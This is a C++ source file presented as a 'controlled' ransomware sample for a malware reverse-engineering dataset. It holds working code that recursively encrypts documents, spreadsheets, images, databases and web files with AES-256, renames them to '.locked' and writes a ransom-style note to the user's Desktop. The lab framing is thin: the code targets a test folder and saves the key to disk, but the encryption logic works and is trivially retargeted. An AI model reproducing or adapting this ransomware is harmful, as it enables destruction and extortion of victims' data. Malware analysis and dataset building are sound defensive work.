#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <random>
#include <algorithm>
#include <sstream>

// OpenSSL headers for cryptography
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

namespace a01_2_ransomware_encrypt_and_coerce
{
    class Form1
    {
    private:
        std::string user_name;
        std::string user_dir = "C:\\Users\\";

    public:
        Form1()
        {
            // In C++, we simulate the environment variable retrieval
            char *env_user = std::getenv("USERNAME");
            if (env_user != nullptr)
            {
                user_name = std::string(env_user);
            }
            else
            {
                user_name = "DefaultUser";
            }

            // Form properties simulation (Opacity, ShowInTaskbar, etc. are UI specific)
            // In a console/service context, these are not directly applicable but
            // the logic flow is preserved.
        }

        // Equivalent to Form1_Load and Form_Shown
        void run()
        {
            // starts encryption at form load
            start_action();
        }

        // AES encryption algorithm
        std::vector<unsigned char> aes_encrypt(const std::vector<unsigned char> &bytes_to_be_encrypted, const std::vector<unsigned char> &password_bytes)
        {
            std::vector<unsigned char> encrypted_bytes;
            unsigned char salt_bytes[] = {1, 2, 3, 4, 5, 6, 7, 8};

            // PBKDF2 derivation (equivalent to Rfc2898DeriveBytes.Pbkdf2)
            unsigned char derived[48];
            PKCS5_PBKDF2_HMAC(
                (const char *)password_bytes.data(), password_bytes.size(),
                salt_bytes, sizeof(salt_bytes),
                1000,
                EVP_sha256(),
                48,
                derived);

            unsigned char key[32];
            unsigned char iv[16];
            std::copy(derived, derived + 32, key);
            std::copy(derived + 32, derived + 48, iv);

            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

            int len;
            int ciphertext_len;
            encrypted_bytes.resize(bytes_to_be_encrypted.size() + AES_BLOCK_SIZE);

            EVP_EncryptUpdate(ctx, encrypted_bytes.data(), &len, bytes_to_be_encrypted.data(), bytes_to_be_encrypted.size());
            ciphertext_len = len;

            EVP_EncryptFinal_ex(ctx, encrypted_bytes.data() + len, &len);
            ciphertext_len += len;

            encrypted_bytes.resize(ciphertext_len);
            EVP_CIPHER_CTX_free(ctx);

            return encrypted_bytes;
        }

        // creates random encryption key
        std::string generate_key(int length)
        {
            const std::string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            std::string res = "";

            std::random_device rd;
            std::mt19937 generator(rd());
            std::uniform_int_distribution<int> distribution(0, valid.size() - 1);

            while (0 < length--)
            {
                res += valid[distribution(generator)];
            }
            return res;
        }

        // Encrypts single file
        void encrypt_file(std::string file, std::string password)
        {
            // Check if file ends with .locked
            std::string extension = fs::path(file).extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
            if (extension == ".locked")
            {
                return;
            }

            // Read all bytes
            std::ifstream input(file, std::ios::binary);
            std::vector<unsigned char> bytes_to_be_encrypted((std::istreambuf_iterator<char>(input)), (std::istreambuf_iterator<char>()));
            input.close();

            // Hash the password with SHA256
            unsigned char hash[SHA256_DIGEST_LENGTH];
            SHA256((const unsigned char *)password.c_str(), password.length(), hash);
            std::vector<unsigned char> password_bytes(hash, hash + SHA256_DIGEST_LENGTH);

            std::vector<unsigned char> bytes_encrypted = aes_encrypt(bytes_to_be_encrypted, password_bytes);

            // Write all bytes
            std::ofstream output(file, std::ios::binary);
            output.write((const char *)bytes_encrypted.data(), bytes_encrypted.size());
            output.close();

            // Move file to .locked
            fs::rename(file, file + ".locked");
        }

        // Encrypts a directory and all its subdirectories
        void encrypt_directory(std::string location, std::string password)
        {
            // extensions to be encrypt
            std::vector<std::string> valid_extensions = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};

            try
            {
                for (const auto &entry : fs::directory_iterator(location))
                {
                    if (fs::is_regular_file(entry.path()))
                    {
                        std::string ext = entry.path().extension().string();
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                        bool isValid = false;
                        for (const auto &valid_ext : valid_extensions)
                        {
                            if (ext == valid_ext)
                            {
                                isValid = true;
                                break;
                            }
                        }

                        if (isValid)
                        {
                            try
                            {
                                encrypt_file(entry.path().string(), password);
                            }
                            catch (...)
                            {
                                // Ignore individual file errors
                            }
                        }
                    }
                    else if (fs::is_directory(entry.path()))
                    {
                        try
                        {
                            encrypt_directory(entry.path().string(), password);
                        }
                        catch (...)
                        {
                            // Ignore inaccessible directories
                        }
                    }
                }
            }
            catch (...)
            {
                // Ignore directory access errors
            }
        }

        // Starts the encryption process
        void start_action()
        {
            std::string password = generate_key(15);
            std::string key_path = "C:\\Users\\Public\\A01_2_Lab_Encryption_Key.txt";

            std::ofstream key_file(key_path);
            key_file << password;
            key_file.close();

            std::string start_path = "C:\\Users\\Public\\A01_TestData";

            if (fs::exists(start_path) && fs::is_directory(start_path))
            {
                encrypt_directory(start_path, password);
            }
            message_creator();
            password = ""; // Clear password

            // Application.Exit() equivalent
            std::exit(0);
        }

        void message_creator()
        {
            std::string path = "\\Desktop\\READ_IT.txt";
            std::string fullpath = user_dir + user_name + path;

            std::ofstream note_file(fullpath);
            note_file << "A01_2 controlled ransomware/coercion sample." << std::endl;
            note_file << "Files in C:\\Users\\Public\\A01_TestData have been encrypted." << std::endl;
            note_file << "This note is generated for malware reverse-engineering dataset analysis." << std::endl;
            note_file << "No payment is required. Use the lab key file to decrypt test files." << std::endl;
            note_file.close();
        }
    };

    class Program
    {
    public:
        static void main()
        {
            // In C++, we don't have WinForms Application.Run directly in standard libs.
            // We instantiate the class and trigger the logic.
            Form1 form;
            form.run();
        }
    };
}

int main()
{
    a01_2_ransomware_encrypt_and_coerce::Program::main();
    return 0;
}
